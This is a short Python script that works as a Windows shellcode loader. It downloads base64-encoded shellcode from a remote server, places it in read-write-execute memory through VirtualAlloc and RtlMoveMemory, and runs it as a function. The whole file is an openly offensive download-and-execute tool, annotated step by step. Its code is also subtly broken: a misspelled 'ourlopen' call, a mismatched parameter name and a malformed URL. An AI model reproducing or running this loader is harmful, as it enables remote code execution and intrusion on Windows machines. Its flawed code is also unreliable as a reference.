from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.ourlopen(url) as response:
        # decode base64-encoded shellcode from web server
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    # Set VirtualAlloc return type to be a pointer: 
    # this ensures the width of the memory address returned
    # matches the width of RtlMoveMemory
    kernel32.VirtualAlloc.restype   = ctypes.c_void_p
    # Seta arguments to be two pointers and a size object
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    # Allocate the memory and give it permissions to read, write and execute
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # Move the buffer into allocated memory
    kernel32.RtlMoveMemory(ptr, buf, length)
    # returns the pointer to the buffer
    return ptr

def run(sellcode):
    # create buffer in memory to hold the shellcode
    buffer = ctypes.create_string_buffer(shellcode)
    
    ptr = write_memory(buffer)
    # ctypes.cast allows us to cast the buffer to act as a function pointer
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # call the shellcode like any other Python function
    shell_func()

if __name__ == '__main__':
    # web server with shellcode in base64 format
    url = "http://1:666/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)

